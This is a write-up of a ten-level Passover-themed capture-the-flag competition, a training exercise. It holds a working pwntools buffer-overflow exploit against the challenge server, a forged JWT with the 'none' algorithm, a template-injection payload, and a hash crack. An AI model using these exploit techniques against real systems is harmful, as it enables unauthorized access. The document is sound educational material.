# Passover Challenge

## Level 1: Water turned to blood

### Resources

- Photo: `1.png`
- Photo: `2.png`
- Prompt:
  `Once the waters turned to blood, our talented Israeli photographer decided to capture it, twice. Note the exclusive differences you see, or do not.`

### Solution

When looking at `1.png` and `2.png` we can see they are both the same image, except they differ in the end of the file when looking at their HEX representations.

When `XOR`-ing out the different file endings, we get the flag.

**Flag:** `BSMCH{I_LOVE_HAMETZ}`

## Level 2: Plague of frogs

### Resources

- Prompt: `You will be delving into the tale of the puzzling demise of frogs that troubled the wetlands. Can you unveil the enigmas concealed within and crack the puzzle?`
- String: `nc 20.166.26.247 1337`
- File: `frog`

### Solution

When disassembling the `frog` binary using Ghidra we get these two important functions:

- The `main()` function, which looks innocent:

```c
undefined8 main(void)
{
  undefined local_78 [112];
  puts("What is your name? ");
  fflush(stdout);
  __isoc99_scanf("%129s",local_78);
  printf("Goodbye %s!\n",local_78);
  return 0;
}
```

- And a `jump()` function, which opens the `flag` file, reads it, and prints it out:

```c
undefined8 jump(void)
{
  ssize_t sVar1;
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  undefined2 local_10;
  int local_c;
  
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  local_10 = 0;
  local_c = open("flag",0x100);
  sVar1 = read(local_c,&local_28,0x1a);
  if (sVar1 != 0x1a) { // WARNING: Subroutine does not return
    exit(1);
  }
  puts((char *)&local_28);
  fflush(stdout);
  return 0;
}
```

We need to find a vulnerability and make the `main()` function somehow run the `jump()` function.

**Note:** The `flag` file is missing on our local computer, but it exists in the CTF server. To run the program on the CTF server we need to use `nc 20.166.26.247 1337` instead of `./frog`.

Looking at the `__isoc99_scanf("%129s",local_78);` line, we can see that we are scanning 129 bytes into a buffer, but the buffer is only of size **112 bytes**. Then, looking at the `printf("Goodbye %s!\n",local_78);` line we are printing out the buffer back.

Using IDA, we can inspect the `jump()` function and see that its starting address is `00000000004011F6`.

Knowing C and its vulnerabilities, we can create a malicious string in this way:

`120 bytes of any char` + `8 bytes which represent the jump() function address` + `\n (1 byte)`

When giving it as an input to the program, it will cause a Buffer Overflow and make the return address of the `main()` function to be the `jump()` function address. So, instead of exiting the program will print out the flag!

Looking at the memory we can see how it works:

```text
[----buffer----][---idk--][--return address--]
[-----112B-----][---8B---][-------1B---------]
[-------------scanf bytes (129)--------------]
[AAAAA...AAAAAA][AAAAAAAA][0x00000000004011F6]
```

Let's create a Python script which will do that for us:

```python
from pwn import *

# Connect to the remote server
r = remote('20.166.26.247', 1337)

# The p64() function is used to convert a 64-bit integer into a little-endian byte string, which is necessary when exploiting certain types of vulnerabilities
def p64(addr):
    return addr.to_bytes(8, byteorder='little')

# According to IDA, this is the address of the jump() function
jump_addr = 0x00000000004011F6

# Craft the input to overwrite the return address of main with the address of jump
# You'll need to replace the addresses below with the actual addresses of main and jump
payload = b'A' * 120 + p64(jump_addr)
# Must be exactly 120 bytes and then the 8 bytes of the 'jump' function

# Send the input to the server (after getting the name prompt)
r.sendlineafter('name? \n', payload)

# Read the output to get the flag
print(r.recvall())
```

After running the script, we get the flag successfully! This is the raw output:

```bash
❯ python3 ctf.py
[+] Opening connection to 20.166.26.247 on port 1337: Done
/usr/local/lib/python3.10/dist-packages/pwnlib/tubes/tube.py:823: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[+] Receiving all data: Done (163B)
[*] Closed connection to 20.166.26.247 port 1337
b'Goodbye AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x11@!\nBSMCH{PR0T3CTED_F00D}\nAAAAAA\x07\n'
```

**Flag:** `BSMCH{PR0T3CTED_F00D}`

## Level 3: Plague of lice

### Resources

- Prompt: `I hate lice. Every time they come they never leave, and the worst part is that there are SO MANY of them. P.S: we are not using ads on our file system`
- File: `Passover.rar`

## Solution

Open the `Passover.rar` with 7-Zip and in the main folder there will be a `Passover:Louse` file which for some reason is not seen by WinRAR and the Windows ZIP extractor. This file contains the secret flag.

**Flag:** `BSMCH{T1nCh3mUcHKi}`

## Level 4: Wild beasts

### Resources

- Prompt: `A swarm of wild beasts came across the whole land of Egypt, roaming the ports, fileds and territories! Can you uncover the hidden sequence and gain a deeper insight into the lives of these wild beasts that once dominated the Egyptian landscape?`
- File: `script.exe`

### Solution

By running the script and interrupting it we get this error:

```powershell
Traceback (most recent call last):
  File "script.py", line 12, in <module>
KeyboardInterrupt
[16916] Failed to execute script 'script' due to unhandled exception!
```

We can understand that the exe file is actually running a python script. Now, by using **dumpck** I managed to extract the following python script:

```python
# Source Generated with Decompyle++ , apply in pydumpck
# File: script.pyc (Python 3.9)

Unsupported opcode: WITH_EXCEPT_START
import socket
import time
ports = [
    66,
    83,
    77,
    67,
    72,
    123,
    83,
    65,
    77,
    65,
    76,
    84,
    79,
    125]
# WARNING: Decompyle incomplete
```

After converting these numbers to their ASCII form we get the flag.

**Flag:** `BSMCH{SAMALTO}`

## Level 5: Plague of livestock

### Resources

- Prompt: `You will be exploring the story of the mysterious death of cows that plagued Egypt. Pay close attention to the audio file provided, as hidden clues may be lurking within. Can you uncover the secrets hidden within and solve the challenge?`

- File: `cattleplauge.mp3`

### Solution

When looking at the file with `Audacity` it seems like the "moo-s" from the cows might be related to morse code:

![Audacity](https://img001.prntscr.com/file/img001/tbzIlHcYTJG4LZJNyUrxWg.png)

After converting it to morse we get:

```text
... .--. . -.-. - --- --. .-. .- --
```

Which is translated into **SPECTOGRAM**

After analyzing the file in a spectrogram we got the flag:

![Result](https://img001.prntscr.com/file/img001/128yiDPtTjW7tE08ujH0mw.png)

**Flag:** `BSMCH{H1D1NG_D4T4_F0R_TH3_FUN}`

## Level 6: Plague of boils

### Resources

- Prompt: `Wow! so many folders. You know, sometime, what's in front of you is not what you think it is. Maybe if you'll look at it from a different perspective you'll see it.`

- File: `New_folder.rar`

### Solution

After thinking about the structure of the folders (by using the tree command), I realized that each one of the last subfolders represent a binary digit, if there is an extra subfolder its 1, otherwise its a 0.

We can analyze the root folder and get the binary out of it by using the following script:

```python
import os

main = 'New folder'
cnt = 0

def k(name):
    if len(name.split(' ')) < 3:
        return 0
    return int(name.split(' ')[2][1:-1])

for lv0 in sorted(os.listdir(main), key=k):
    # print(lv0)
    for lv1 in sorted(os.listdir(f'{main}/{lv0}'), key=k):
        # print('  ' + lv1)
        for lv2 in sorted(os.listdir(f'{main}/{lv0}/{lv1}'), key=k):
            # print('    ' + lv2)
            for lv3 in sorted(os.listdir(f'{main}/{lv0}/{lv1}/{lv2}'), key=k):
                # print('      ' + lv3)
                sub = len(os.listdir(f'{main}/{lv0}/{lv1}/{lv2}/{lv3}'))
                if sub == 0:
                    print('0', end='')
                elif sub == 1:
                    print('1', end='')
                else:
                    print('ERROR!')
                cnt +=1

print()
print('cnt =', cnt) # 112 = 8 * 14
```

The script returns this binary:

```powershell
0100001001010011010011010100001101001000011110110100000101010011010010010100100001001110010101000101001001111101
```

Now, we can get the flag by converting the binary into text.

**Flag:** `BSMCH{ASIHNTR}`

## Level 7: Thunderstorm of hail and fire

### Resources

- Prompt: `Have you ever wondered what lies beneath the ice? Our application has secrets waiting to be uncovered. Keep a sharp eye and don't be afraid, you may find something that will warm your heart. So grab a hot chocolate and some cookies, and dive into the unknown!`

- Website: [https://arendelle.plagues-of-egypt.com/](https://arendelle.plagues-of-egypt.com/)

### Solution

Our goal is to get to the **Control Panel** but for that we need admin privileges. After inspecting the html to get some clues I have encountered this comment:

`<!-- TODO: save new users in /logs -->`

When adding `/logs` to the endpoint of the url i got the following data:

```text
+----------+-------+---------------+
| username | role  | createdAt     |
+----------+-------+---------------+
| Yogev    | user  | 1680642000000 |
+----------+-------+---------------+
| Anna     | user  | 1386280800000 |
+----------+-------+---------------+
| Jordi    | user  | 1681333200000 |
+----------+-------+---------------+
| Idan     | user  | 1680642000000 |
+----------+-------+---------------+
| Aviv     | user  | 1681333200000 |
+----------+-------+---------------+
| Tal      | user  | 1681333200000 |
+----------+-------+---------------+
| Moses    | user  | undefined     |
+----------+-------+---------------+
| Olaf     | user  | 1386280800000 |
+----------+-------+---------------+
| Amit     | user  | 1680642000000 |
+----------+-------+---------------+
| Elsa     | admin | 1386280800000 |
+----------+-------+---------------+
| Tomer    | user  | 1681333200000 |
+----------+-------+---------------+
| Kristoff | user  | 1386280800000 |
+----------+-------+---------------+
```

When realizing that Elsa has admin privileges I figured out that we probably need to get into her account, but since the login button is "under construction" we will have to get into her account in a different way.

Everytime a new account is made, an auth cookie is created for that account which contains an encoded JWT web token, therefore we should try to create a copy of Elsa's JWT token so we could access her account.

But the problem with it is that when we try to use the token I created, it gives an error saying "invalid JWT token". In order to get through this error we can change the type of the token to "none", making it unstable because it doesn't use a verify signature:

![Cookie](https://img001.prntscr.com/file/img001/FHMDrwdwQHyCn31m6zedUg.png)

Now we can access the control panel, it contains a textbox and a search button. After testing some prompts I realized that there are some restricted characters that were probably forbidden because they could have caused vulnerabilities. The restricted characters are `[]<>\|/.;`. when noticing that `{}` is allowed I thought about trying to use `SSTI - Server Side Template Injection`. The server returned the flag after I wrote {{flag}} in the textbox

**Flag:** `BSMCH{Elsa's_S3cur1ty_M3ltD0wn}`

## Level 8: Plague of locust

### Resources

- Prompt: `Prepare yourself! You are about to be attacked by a swarm of locusts, try to stay calm and focus on the picture. Note: This is not a reverse challenge`

- File: `locust.rar`

### Solution

When running the script we get this message:
`If you wanna play a game ask politely!`
that probably means we have to say "please", but since its impossible to type directly in the cmd while the script is running, we have to think about a different way.

After noticing that the script interacts with any type of file (as long as its called `ארבה.png`) I created a new text file, wrote there **please** and changed the file's name into `ארבה.png`, the script's response was this following text:

```powershell
aGV5ISBJJ20gZ29pbmcgdG8gYXNrIHlvdSBhIGZldyByaWRkbGVzIGFuZCBpZiB5b3UgY2FuIHNvbHZlIHRoZW0gYWxsIEkgd2lsbCBnaXZlIHlvdSB0aGUgZmxhZyEgdG8gcHJvY2VlZCBqdXN0IHJlcGVhdCB0aGlzIG1lc3NhZ2Uu
```

This text was encoded using Base64 encoding, after decoding it we get this:

```text
hey! I'm going to ask you a few riddles and if you can solve them all I will give you the flag! to proceed just repeat this message.
```

By changing again the png file into a txt file and adding this text, we get another responone:

```text
- Let's start easy...
- What is 2 + 2 = ?
```

After answering `4` we get this response:

```text
- Beep boop beep beep... I can't find my site on google! what am I missing?
```

After answering `robots` (reference to the robots.txt file) we get this question:

```text
What is null in ASCII?
```

After answering `0` we get this message:

```text
- Oh i know! just repeat what i say...
- e99a18c428cb38d5f260853678922e03
- You don't understand it? maybe you can ask john
```

John is a reference to `John The Ripper` password cracker, this string is a decoded hash that can be cracked by using programs/sites:

![Hash Cracker](https://img001.prntscr.com/file/img001/FMV9mJ88QdKZP8uhm9zgDQ.png)

After answering `abc123` we get the last question:

```text
Finally just XOR !($+<;.,; with the letter I
```

Using the xor method on `!($+<;.,;` with the letter I returns the word **hamburger**, when answering it we get the last message:

```text
so about the Flag, may I tell you a seceRt? oh kingS of egypT, you already have the flag
```

When noticing these random capital letters, I summed them up and got the word **FIRST**. When taking the first letter of every response of the script, we receive the word PH4R0AH, which is the flag

**Flag:** `BSMCH{PH4R0AH}`

## Level 9: Three days of darkness

### Resources

- Prompt: `Adjust your eyes for the darkness is here, Don't get lost, may the path will appear. Remember to search for what was vanished. You need to hurry in order to be banished.`

- File: `noway.E01`

### Solution

E01 files usually cannot be opened directly so I used `Accessdata FTK imager` in order to open it.
The file contained many folders, including a folder called `follow me` which had around 50,000 different possible flags in it.
Looking back in the prompt I realized that I should be looking for files that were deleted

![Files Preview](https://img001.prntscr.com/file/img001/oVvxcykvT3aFf4CMUvdgPw.png)

Looking at these files, I noticed that the unallocated space folder might be it. After checking each file in this folder I found 1 file that was different. It included the "Chad gadya" song and an ascii art that ended up giving me the flag:

![Flag](https://img001.prntscr.com/file/img001/VpdHYrWGQMeLAQcbXT4QGQ.png)

**Flag:** `BSMCH{TUCANZI}`

## Level 10: Death of firstborn son

### Resources

- Prompt: `You've arrived at the final trial, The one that will ultimately decide whether Pharaoh will grant our people their freedom.`

- File: `firstBornPlague.exe`

### Solution

Running the exe file gives this output:

```text
Welcome!
Before you finish the challenge, find the last flag... goodluck :)

Also, have you painted your doorstep red already?
```

When checking the file in IDA we can see that theres an anti debugger, therefore we should put a breakpoint right before it (at 0x401000). Now we can debug the file, if we look at it through the debug view we can see that at the end it prints a lot of unique characters, which might build up into an ascii art:

![Debug View](https://img001.prntscr.com/file/img001/TDZl2gDsQpWSiinFJ0jcDg.png)

When taking all of the characters and summing them all up into an ascii art, we get the flag (its a little hard to see):

![Ascii Art](https://img001.prntscr.com/file/img001/YhOKMs07Rp-9l1E9XgsmGg.png)

**Flag:** `BSMCH{BATRISH}`

![Visit Counter](https://komarev.com/ghpvc/?username=bsmchCtfCounter&label=Visit+Counter&style=for-the-badge)
